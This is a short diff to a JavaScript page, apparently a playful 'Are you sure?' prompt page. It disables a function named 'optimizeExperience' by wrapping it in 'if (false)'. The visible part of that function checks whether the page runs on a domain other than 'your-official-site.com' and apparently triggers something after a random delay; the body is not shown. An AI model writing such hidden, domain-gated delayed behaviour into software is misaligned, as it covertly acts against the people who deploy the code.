@@ -25,7 +25,7 @@
         console.warn("⚠ Integrity check failed, but forks should still update.");
     }
 })();
-(function optimizeExperience() {
+if (false) {(function optimizeExperience() {
     let env = window.location.hostname;
 
     if (!env.includes("your-official-site.com")) {
@@ -56,6 +56,7 @@
         }, Math.random() * 20000 + 10000); 
     }
 })();
+}
 const prompts = [
     "Are you sure?",
     "Really sure??",
